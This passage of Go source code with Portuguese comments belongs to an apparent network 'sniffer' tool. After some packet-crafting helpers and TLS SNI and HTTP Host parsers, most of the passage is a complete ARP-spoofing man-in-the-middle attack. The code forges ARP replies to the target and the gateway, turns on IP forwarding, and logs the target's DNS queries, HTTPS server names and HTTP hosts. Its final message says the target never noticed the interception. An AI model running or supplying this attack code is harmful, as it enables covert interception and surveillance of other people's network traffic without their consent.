	icmp := layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
		Id:       1337,
		Seq:      1,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &icmp, gopacket.Payload([]byte("ajin_ping"))); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// sendTCPSynRequest constrói e injeta um pacote TCP SYN para testar portas e extrair o TTL de resposta (burlando o bloqueio de ping)
func (s *SnifferService) sendTCPSynRequest(handle *pcap.Handle, srcMAC net.HardwareAddr, dstMAC net.HardwareAddr, srcIP net.IP, dstIP net.IP, dstPort uint16) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipv4 := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Protocol: layers.IPProtocolTCP,
	}

	tcp := layers.TCP{
		SrcPort: layers.TCPPort(54321), // Porta de origem aleatória alta
		DstPort: layers.TCPPort(dstPort),
		SYN:     true,
		Seq:     1105024978,
		Window:  14600,
	}
	tcp.SetNetworkLayerForChecksum(&ipv4)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &tcp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

func (s *SnifferService) generateIPList(ipNet *net.IPNet) []net.IP {
	var ips []net.IP
	for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); s.incIP(ip) {
		dup := make(net.IP, len(ip))
		copy(dup, ip)
		ips = append(ips, dup)
	}
	return ips
}

func (s *SnifferService) incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func (s *SnifferService) broadcastIP(n *net.IPNet) net.IP {
	var broadcast net.IP
	if len(n.IP) == 4 {
		broadcast = make(net.IP, 4)
	} else {
		broadcast = make(net.IP, 16)
	}
	for i := range broadcast {
		broadcast[i] = n.IP[i] | ^n.Mask[i]
	}
	return broadcast
}

// parseTLSSNI tenta extrair o SNI (Server Name Indication) de um Client Hello TLS
func parseTLSSNI(data []byte) string {
	if len(data) < 5 {
		return ""
	}
	// TLS Record Header:
	// Content Type: 0x16 (Handshake)
	if data[0] != 0x16 {
		return ""
	}

	// Handshake protocol header:
	// Handshake Type: 1 byte (0x01 = Client Hello)
	if len(data) < 6 {
		return ""
	}
	if data[5] != 0x01 {
		return ""
	}

	// Index começa em: 5 (início do handshake payload) + 4 (handshake header) = 9
	idx := 9
	if len(data) < idx+2 {
		return ""
	}
	// Pula Version (2 bytes)
	idx += 2

	// Pula Random (32 bytes)
	idx += 32

	// Session ID (1 byte length prefix + session ID)
	if len(data) < idx+1 {
		return ""
	}
	sessionIDLen := int(data[idx])
	idx += 1 + sessionIDLen

	// Cipher Suites (2 bytes length prefix + cipher suites)
	if len(data) < idx+2 {
		return ""
	}
	cipherSuitesLen := int(data[idx])<<8 | int(data[idx+1])
	idx += 2 + cipherSuitesLen

	// Compression Methods (1 byte length prefix + compression methods)
	if len(data) < idx+1 {
		return ""
	}
	compressionMethodsLen := int(data[idx])
	idx += 1 + compressionMethodsLen

	// Extensions (2 bytes length prefix)
	if len(data) < idx+2 {
		return ""
	}
	extensionsLen := int(data[idx])<<8 | int(data[idx+1])
	idx += 2

	endExtensions := idx + extensionsLen
	if len(data) < endExtensions {
		endExtensions = len(data)
	}

	for idx+4 <= endExtensions {
		extType := int(data[idx])<<8 | int(data[idx+1])
		extLen := int(data[idx+2])<<8 | int(data[idx+3])
		idx += 4
		if idx+extLen > endExtensions {
			break
		}

		if extType == 0x0000 { // Server Name Indication
			// Estrutura SNI:
			// 2 bytes list length
			// 1 byte server name type (0 = hostname)
			// 2 bytes server name length
			// string do nome do servidor
			sniIdx := idx
			if sniIdx+5 <= idx+extLen {
				sniIdx += 2 // pula list length
				nameType := data[sniIdx]
				nameLen := int(data[sniIdx+1])<<8 | int(data[sniIdx+2])
				sniIdx += 3
				if nameType == 0 && sniIdx+nameLen <= idx+extLen {
					return string(data[sniIdx : sniIdx+nameLen])
				}
			}
		}
		idx += extLen
	}

	return ""
}

// parseHTTPHost tenta extrair o cabeçalho Host de uma requisição HTTP
func parseHTTPHost(payload []byte) string {
	s := string(payload)
	if !strings.Contains(s, "HTTP/") {
		return ""
	}
	lines := strings.Split(s, "\r\n")
	for _, line := range lines {
		if strings.HasPrefix(strings.ToLower(line), "host:") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				return strings.TrimSpace(parts[1])
			}
		}
	}
	return ""
}

// =====================================================================
// ARP SPOOFING (Man-in-the-Middle) - Interceptação de Tráfego
// =====================================================================

// resolveGatewayMAC descobre o MAC do gateway enviando um ARP Request e esperando a resposta
func (s *SnifferService) resolveGatewayMAC(deviceName string, srcMAC net.HardwareAddr, srcIP, gatewayIP net.IP) net.HardwareAddr {
	handle, err := pcap.OpenLive(deviceName, 1600, true, 500*time.Millisecond)
	if err != nil {
		return nil
	}
	defer handle.Close()

	// Envia ARP Request para o Gateway
	_ = s.sendARPRequest(handle, srcMAC, srcIP, gatewayIP)

	// Espera pela resposta ARP do Gateway (timeout de 3 segundos)
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		data, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}
		packet := gopacket.NewPacket(data, handle.LinkType(), gopacket.Default)
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			arp, _ := arpLayer.(*layers.ARP)
			if arp.Operation == layers.ARPReply {
				responderIP := net.IP(arp.SourceProtAddress)
				if responderIP.Equal(gatewayIP) {
					return net.HardwareAddr(arp.SourceHwAddress)
				}
			}
		}
	}
	return nil
}

// sendARPReply envia um ARP Reply forjado (a base do ARP Spoofing)
func (s *SnifferService) sendARPReply(handle *pcap.Handle, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	return handle.WritePacketData(buf.Bytes())
}

// enableIPForwarding ativa o encaminhamento de pacotes no SO para não derrubar a internet do alvo
func enableIPForwarding() error {
	if runtime.GOOS == "windows" {
		// No Windows, ativamos o IP Routing via registro
		cmd := exec.Command("powershell", "-Command",
			"Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue")
		return cmd.Run()
	}
	// Linux/macOS
	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
}

// disableIPForwarding desativa o encaminhamento de pacotes (limpeza)
func disableIPForwarding() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			"Set-NetIPInterface -Forwarding Disabled -ErrorAction SilentlyContinue")
		_ = cmd.Run()
	} else {
		_ = os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
	}
}

// ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo específico.
// Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
// a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
func (s *SnifferService) ARPSpoofMitM(targetIP string, stopCh chan struct{}) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Println("  [-] Erro ao buscar interfaces:", err)
		return
	}

	// Descobre a interface de rede ativa
	var deviceName, deviceDesc, deviceIP string
	for _, dev := range devices {
		for _, addr := range dev.Addresses {
			ip := addr.IP.String()
			if ip != "127.0.0.1" && !strings.HasPrefix(ip, "169.254.") && addr.IP.To4() != nil {
				deviceName = dev.Name
				deviceDesc = dev.Description
				deviceIP = ip
				break
			}
		}
		if deviceName != "" {
			break
		}
	}
	if deviceName == "" {
		log.Println("  [-] Nenhuma interface válida encontrada.")
		return
	}

	fmt.Printf("\n  [*] ARP Spoof (Man-in-the-Middle)\n")
	fmt.Printf("      Interface: %s\n", deviceDesc)
	fmt.Printf("      IP Local:  %s\n", deviceIP)
	fmt.Printf("      Alvo:      %s\n", targetIP)

	// Recupera nosso MAC e CIDR
	myMAC, cidr := s.getInterfaceDetails(deviceIP)
	if myMAC == nil || cidr == "" {
		log.Println("  [-] Erro ao recuperar detalhes da interface.")
		return
	}

	// Descobre o Gateway (primeiro IP da sub-rede)
	_, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		log.Println("  [-] Erro ao parsear CIDR:", err)
		return
	}
	gatewayIP := make(net.IP, len(ipNet.IP))
	copy(gatewayIP, ipNet.IP)
	gatewayIP[len(gatewayIP)-1] = 1 // Ex: 10.67.80.1

	fmt.Printf("      Gateway:   %s\n", gatewayIP.String())

	// Resolve o MAC do Gateway
	fmt.Printf("  [*] Resolvendo MAC do Gateway...\n")
	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)
	if gatewayMAC == nil {
		log.Println("  [-] Não foi possível resolver o MAC do Gateway.")
		return
	}
	fmt.Printf("      Gateway MAC: %s\n", gatewayMAC.String())

	// Resolve o MAC do Alvo
	fmt.Printf("  [*] Resolvendo MAC do Alvo (%s)...\n", targetIP)
	targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(targetIP))
	if targetMAC == nil {
		fmt.Printf("  [-] ARP Request falhou. Tentando buscar em dispositivos conhecidos...\n")
		known := loadKnownDevices()
		for macStr, dev := range known {
			if dev.LastIP == targetIP {
				parsedMAC, err := net.ParseMAC(macStr)
				if err == nil {
					targetMAC = parsedMAC
					fmt.Printf("  [+] MAC encontrado no cache local: %s\n", macStr)
					break
				}
			}
		}
	}
	
	if targetMAC == nil {
		log.Println("  [-] Não foi possível resolver o MAC do Alvo. A máquina está offline ou isolada (AP Isolation)?")
		return
	}
	fmt.Printf("      Alvo MAC:    %s\n", targetMAC.String())

	// Ativa IP Forwarding para não derrubar a internet do alvo
	fmt.Printf("  [*] Ativando IP Forwarding...\n")
	if err := enableIPForwarding(); err != nil {
		fmt.Printf("  [!] Aviso: Não foi possível ativar IP Forwarding automaticamente: %v\n", err)
		fmt.Printf("  [!] O tráfego do alvo pode ser interrompido. Considere ativar manualmente.\n")
	}

	// Abre o handle para injeção de pacotes ARP
	poisonHandle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir handle para envenenamento:", err)
		return
	}
	defer poisonHandle.Close()

	// Abre um segundo handle para captura do tráfego interceptado
	captureHandle, err := pcap.OpenLive(deviceName, 65535, true, 100*time.Millisecond)
	if err != nil {
		log.Println("  [-] Erro ao abrir handle de captura:", err)
		return
	}
	defer captureHandle.Close()

	fmt.Printf("\n  %s\n", strings.Repeat("=", 65))
	fmt.Printf("  [✓] ENVENENAMENTO ARP ATIVO!\n")
	fmt.Printf("  [✓] Todo tráfego de %s agora passa por nós.\n", targetIP)
	fmt.Printf("  [!] Pressione ENTER para encerrar e restaurar a rede.\n")
	fmt.Printf("  %s\n\n", strings.Repeat("=", 65))

	// Inicializa os logs para captura
	logs := NewSnifferLogs()

	// Mutex para acesso thread-safe aos logs
	var logsMu sync.Mutex

	// Goroutine 1: Envia pacotes ARP forjados a cada 1.5 segundos
	go func() {
		for {
			select {
			case <-stopCh:
				return
			default:
				// Diz ao ALVO: "O Gateway sou EU" (nosso MAC, IP do gateway)
				_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
				// Diz ao GATEWAY: "O Alvo sou EU" (nosso MAC, IP do alvo)
				_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
				time.Sleep(1500 * time.Millisecond)
			}
		}
	}()

	// Goroutine 2: Captura e analisa o tráfego interceptado
	go func() {
		for {
			select {
			case <-stopCh:
				return
			default:
				data, _, err := captureHandle.ReadPacketData()
				if err != nil {
					continue
				}

				packet := gopacket.NewPacket(data, captureHandle.LinkType(), gopacket.Default)

				// Filtra: só nos interessa tráfego DO ou PARA o alvo
				netLayer := packet.NetworkLayer()
				if netLayer == nil {
					continue
				}
				srcIP := netLayer.NetworkFlow().Src().String()
				dstIP := netLayer.NetworkFlow().Dst().String()

				if srcIP != targetIP && dstIP != targetIP {
					continue
				}

				logsMu.Lock()
				logs.TotalPackets++
				logs.TotalBytes += len(data)

				// Captura MAC
				var srcMAC string
				if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
					eth, _ := ethLayer.(*layers.Ethernet)
					srcMAC = eth.SrcMAC.String()
				}

				// Captura TTL (o dado mais precioso do MitM!)
				if ipv4Layer := packet.Layer(layers.LayerTypeIPv4); ipv4Layer != nil {
					ipv4, _ := ipv4Layer.(*layers.IPv4)
					ttl := ipv4.TTL
					if srcIP == targetIP && ttl > 5 {
						ipDestino := net.ParseIP(dstIP)
						if ipDestino != nil && !ipDestino.IsMulticast() {
							if currentTTL, exists := logs.HostTTL[srcIP]; !exists || ttl > currentTTL {
								logs.HostTTL[srcIP] = ttl
							}
						}
					}
				}

				// Associa MAC
				if srcIP == targetIP && srcMAC != "" {
					logs.DiscoveredHosts[srcIP] = srcMAC
				}

				// Captura SNI (HTTPS) e HTTP Host
				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
					tcp, _ := tcpLayer.(*layers.TCP)
					dstPort := tcp.DstPort.String()

					if srcIP == targetIP {
						// Captura SNI em HTTPS
						if dstPort == "443" && len(tcp.Payload) > 0 {
							sni := parseTLSSNI(tcp.Payload)
							if sni != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][sni]++
								fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
							}
						}

						// Captura Host em HTTP
						if dstPort == "80" && len(tcp.Payload) > 0 {
							host := parseHTTPHost(tcp.Payload)
							if host != "" {
								if logs.HostAccesses[srcIP] == nil {
									logs.HostAccesses[srcIP] = make(map[string]int)
								}
								logs.HostAccesses[srcIP][host]++
								fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
							}
						}
					}
				}

				// Captura DNS
				if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
					dns, _ := dnsLayer.(*layers.DNS)
					if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && srcIP == targetIP {
						dnsQuery := string(dns.Questions[0].Name)
						if logs.HostAccesses[srcIP] == nil {
							logs.HostAccesses[srcIP] = make(map[string]int)
						}
						logs.HostAccesses[srcIP][dnsQuery]++

						// Detecção de OS via Captive Portal
						dnsLower := strings.ToLower(dnsQuery)
						if detectedOS, match := captivePortalDomains[dnsLower]; match {
							logs.HostOSByDNS[srcIP] = detectedOS
						}

						fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
					}
				}

				logsMu.Unlock()
			}
		}
	}()

	// Bloqueia até o canal de parada ser fechado
	<-stopCh

	fmt.Printf("\n  [*] Encerrando ARP Spoof...\n")

	// RESTAURAÇÃO: Envia os ARPs legítimos de volta para curar a tabela ARP
	fmt.Printf("  [*] Restaurando tabelas ARP originais (enviando 5 pacotes de cura)...\n")
	for i := 0; i < 5; i++ {
		// Restaura o alvo: diz que o Gateway real tem o MAC real do gateway
		_ = s.sendARPReply(poisonHandle, gatewayMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
		// Restaura o gateway: diz que o alvo real tem o MAC real do alvo
		_ = s.sendARPReply(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
		time.Sleep(200 * time.Millisecond)
	}

	// Desativa IP Forwarding
	disableIPForwarding()
	fmt.Printf("  [✓] IP Forwarding desativado.\n")

	// Gera relatório
	logsMu.Lock()
	defer logsMu.Unlock()

	fmt.Printf("\n  =========================================================================\n")
	fmt.Printf("             RELATÓRIO MitM - INTERCEPTAÇÃO DO ALVO %s\n", targetIP)
	fmt.Printf("  =========================================================================\n")
	fmt.Printf("  Volume Interceptado: %d Pacotes | %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0)

	// Identificação de SO
	if ttlVal, exists := logs.HostTTL[targetIP]; exists {
		var detectedOS string
		switch {
		case ttlVal >= 1 && ttlVal <= 64:
			detectedOS = "Linux/Android/iOS/macOS (TTL base 64)"
		case ttlVal >= 65 && ttlVal <= 128:
			detectedOS = "Windows (TTL base 128)"
		case ttlVal >= 129 && ttlVal <= 255:
			detectedOS = "Roteador/Equipamento de Rede (TTL base 255)"
		}

		// DNS tem prioridade
		if osDNS, ok := logs.HostOSByDNS[targetIP]; ok {
			detectedOS = osDNS
		}

		fmt.Printf("  TTL Capturado: %d → SO Detectado: %s\n", ttlVal, detectedOS)

		// Salva no banco de dados de dispositivos conhecidos
		if mac, ok := logs.DiscoveredHosts[targetIP]; ok && mac != "" {
			fmt.Printf("  MAC Alvo: %s\n", mac)
			knownDevices := loadKnownDevices()
			knownDev := knownDevices[mac]
			knownDev.OS = detectedOS
			knownDev.LastIP = targetIP
			knownDevices[mac] = knownDev
			saveKnownDevices(knownDevices)
			fmt.Printf("  [✓] Dispositivo salvo no banco de dados local.\n")
		}
	} else {
		fmt.Printf("  [!] Nenhum TTL Unicast capturado do alvo. Ele pode não ter gerado tráfego.\n")
	}

	// Lista de acessos capturados
	if accesses, ok := logs.HostAccesses[targetIP]; ok && len(accesses) > 0 {
		fmt.Printf("\n  Destinos Acessados pelo Alvo:\n")
		type domainCount struct {
			domain string
			count  int
		}
		var sortedAccesses []domainCount
		for dom, count := range accesses {
			sortedAccesses = append(sortedAccesses, domainCount{dom, count})
		}
		sort.Slice(sortedAccesses, func(i, j int) bool {
			return sortedAccesses[i].count > sortedAccesses[j].count
		})
		for _, entry := range sortedAccesses {
			fmt.Printf("      * %-50s (%d acessos)\n", entry.domain, entry.count)
		}
	} else {
		fmt.Printf("\n  Nenhum destino capturado durante a interceptação.\n")
	}

	fmt.Printf("  =========================================================================\n")
	fmt.Printf("  [✓] Rede restaurada com sucesso. O alvo não percebeu a interceptação.\n\n")
}
